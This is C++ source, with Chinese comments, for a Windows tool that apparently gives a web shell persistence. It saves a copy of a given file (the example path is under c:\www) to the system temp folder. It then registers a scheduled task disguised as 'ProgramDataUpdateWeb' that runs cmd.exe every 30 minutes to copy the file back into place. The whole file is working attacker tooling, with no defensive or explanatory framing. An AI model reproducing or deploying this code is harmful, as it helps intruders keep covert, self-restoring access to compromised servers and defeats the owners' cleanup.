#include "TaskScheduler.h"

// wchar_t to string
void Wchar_tToString(std::string& szDst, wchar_t* wchar)
{
    wchar_t* wText = wchar;
    DWORD dwNum = WideCharToMultiByte(CP_OEMCP, NULL, wText, -1, NULL, 0, NULL, FALSE);// WideCharToMultiByte的运用
    char* psText; // psText为char*的临时数组，作为赋值给std::string的中间变量
    psText = new char[dwNum];
    WideCharToMultiByte(CP_OEMCP, NULL, wText, -1, psText, dwNum, NULL, FALSE);// WideCharToMultiByte的再次运用
    szDst = psText;// std::string赋值
    delete[]psText;// psText的清除
}

// 需包含locale、string头文件、使用setlocale函数。
std::wstring StringToWstring(const std::string str)
{// string转wstring
    unsigned len = str.size() * 2;// 预留字节数
    setlocale(LC_CTYPE, "");     //必须调用此函数
    wchar_t* p = new wchar_t[len];// 申请一段内存存放转换后的字符串
    mbstowcs(p, str.c_str(), len);// 转换
    std::wstring str1(p);
    delete[] p;// 释放申请的内存
    return str1;
}

int wmain(int argc, wchar_t* argv[]) {
    TaskSche task;
    if (argc == 2) {
        string strFilePath;
        Wchar_tToString(strFilePath, argv[1]);
        if (!task.isFileExist((LPSTR)"C:\\windows\\temp\\tempsh.txt"))
        {
            task.copyFile(strFilePath.data(), "C:\\windows\\temp\\tempsh.txt");
        }

        LPCWSTR wszTaskName = L"ProgramDataUpdateWeb";	// 计划任务名字
        wstring wstrTaskTime = L"PT30M";			// 设置每次重新启动任务之间的时间。每隔多久触发
        wstring wstrProgram = L"cmd.exe";		// 执行的程序，cmd.exe或者rundll32.exe
        wstring args = L"/c copy c:\\windows\\temp\\tempsh.txt ";
        args.append(StringToWstring(strFilePath).data());
        wprintf(L"%s\n", args.data());
        task.TaskAdd(wszTaskName, wstrTaskTime, wstrProgram, args);
    }
    else {
        wprintf(L"Usage: %s c:\\www\\1.txt", argv[0]);
    }



}